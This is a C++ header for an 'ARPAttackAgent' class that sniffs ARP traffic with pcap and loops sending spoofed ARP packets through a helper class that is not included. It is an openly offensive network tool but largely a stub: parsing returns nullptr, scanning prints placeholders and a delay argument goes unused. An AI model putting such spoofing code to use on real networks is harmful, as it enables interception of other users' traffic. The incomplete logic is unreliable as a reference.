#pragma once

#include <stdint-gcc.h>
#include <optional>
#include <netinet/in.h>
#include "arp/SendARPManager.cpp"

class ARPAttackAgent {
private:
    char* netInterface;
    uint8_t* senderIP;

    bool isBroadcast = false;
    SendARPManager sendArpManager;

    std::optional<ARPHeader*> processARPPacket(const uint8_t *packet) {
        auto *etherHeader = (EtherHeader *) packet;
        if (ntohs(etherHeader->type) == ETHER_TYPE_ARP) {
            auto *arpHeader = (ARPHeader *) (packet + sizeof(EtherHeader));
            if (arpHeader->opcode == ARP_OPCODE_REPLY) {
            }
        }
        return nullptr;
    }
public:
    const static int UNLIMITED = 0;

    ARPAttackAgent(char* netInterface, uint8_t* senderIP, std::optional<uint8_t*> targetMAC):
    netInterface(netInterface), senderIP(senderIP) {
        if (!targetMAC) isBroadcast = true;
        this->sendArpManager = SendARPManager();
    }

    void scanClients() {
        std::cout << "INFO: Start scanning arp clients..." << std::endl;
        char errBuf[PCAP_ERRBUF_SIZE];

        pcap_t* handle = pcap_open_live(netInterface, BUFSIZ, 1, 1000, errBuf);
        auto go = true;
        while (go) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            pcap_next_ex(handle, &header, &packet);

            auto arp_header = this->processARPPacket(packet);
            std::cout << "Collected ARP Target: " << "some..." << std::endl;
            go = false;
        }
    }

    void sendARPAttack(uint maxAttack, uint delay=1) {
        std::cout << "INFO: Start ARP spoofing attack...." << std::endl;

        bool go = true;
        uint attackCount = 0;
        while (go) {
            std::cout << "[" << attackCount << "]" << " Send attack..." << std::endl;

            this->sendArpManager.sendARPPacket();

            attackCount++;
            if (attackCount > maxAttack and maxAttack != 0) go = false;
        }
    }
};
